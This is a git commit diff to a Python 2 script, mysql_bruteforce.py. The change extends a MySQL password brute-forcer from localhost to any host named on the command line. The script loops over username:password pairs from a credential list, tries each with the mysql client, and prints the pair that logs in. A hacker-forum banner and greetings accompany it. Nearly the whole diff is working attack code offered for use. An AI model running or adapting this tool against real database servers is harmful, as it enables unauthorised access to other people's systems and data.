6f82b9d56cebe9c771da19587433c196cb214e05
KroKite <krrrroookkite@gmail.com>
2015-07-11 22:57:33 +0530

    Update mysql_bruteforce.py

--- mysql_bruteforce.py
+++ mysql_bruteforce.py
@@ -1,8 +1,10 @@
 #!/usr/bin/python
 # Author : KroKite
-# Description: Crack the MySQL Username and Password.
+# Description: Basic Password Bruteforcing Tool.
 # URL: http://facebook.com/r0ckysharma
+# Python Version : 2.7
 
+import sys
 import subprocess
 import re
 
@@ -17,18 +19,22 @@ print '''
         \__|  \__| \__| \__| \______/  \__| \__| \______|   \__|   \________|
         '''
 print "[+] Please Report any Bug to krokite@worldofhacker.com"
-print "[+] Greets to: c1ph3r(Krit Kadnok), Nocdem, MayaSeven, Xcode, webDEVIl, b0nd, Aseem Jakhar, Vivek Ramachandran , fb1h2s , Prashant Mahajan, and Other NullCon members, Sukesh Reddy, Sarmanjit Singh, Rakesh Kumar"
+print "[+] Greets to: c1ph3r(Krit Kadnok), Nocdem, MayaSeven, Xcode, webDEVIl, fb1h2s, Aseem Jakhar, Prashant Mahajan, and Other NullCon members, Sukesh Reddy, Sarmanjit Singh, Rakesh Kumar"
 print "[+] For Security Releated Discussions, Do Visit us at http://www.garage4hackers.com or http://forum.worldofhacker.com"
 print "[+] This Application helps you to crack mysql password with given list"
-print "[+] Usage: python mysql_bruteforce.py"
+print "[+] Usage: python mysql_bruteforce.py ip_or_hostname_here"
 print "\n"
-fo = open("password.txt", 'r');
+
+fo = open("credentiallist.txt", 'r');
 for lines in fo:
         password = lines.split('\n')
         creds = password[0].split(':')
-        command = "mysql -h 127.0.0.1 -u {0} -p{1} -e STATUS".format(creds[0], creds[1])
-        brute = subprocess.Popen(command.split(), stdout=subprocess.PIPE)
-        if(re.search("Uptime", brute.communicate()[0])):
-                print "Password Cracked and your Username:Password is ", creds[0],":",creds[1]
+        if(len(sys.argv) == 2):
+                command = "mysql -h {0} -u {1} -p{2} -e STATUS".format(sys.argv[1], creds[0], creds[1])
+                brute = subprocess.Popen(command.split(), stdout=subprocess.PIPE)
+                if(re.search("Uptime", brute.communicate()[0])):
+                        print "Password Cracked and your Username:Password is ", creds[0],":",creds[1]
+                        exit()
+        else:
+                print "[+] Usage: \n\t[+] root@system# chmod u+x mysql_bruteforce.py\n\t[+] root@system# ./mysql_bruteforce.py ip_or_hostname_here"
                 exit()
-~
